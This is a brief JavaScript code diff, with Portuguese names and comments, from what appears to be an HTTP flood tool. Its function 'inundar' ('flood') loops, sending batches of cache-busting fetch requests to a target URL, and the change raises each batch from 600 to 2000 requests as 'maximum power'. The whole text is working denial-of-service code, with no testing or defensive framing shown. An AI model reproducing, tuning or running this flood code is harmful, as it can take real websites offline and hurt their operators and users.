@@ -111,7 +111,7 @@ async function toggleTsunami() {
 
 async function inundar(url) {
     while (ativo) {
-        const lote = 600; // Potência máxima configurada
+        const lote = 2000; // Potência máxima configurada
         const disparos = Array.from({ length: lote }, () => 
             fetch(`${url}?t=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' })
                 .then(() => { 
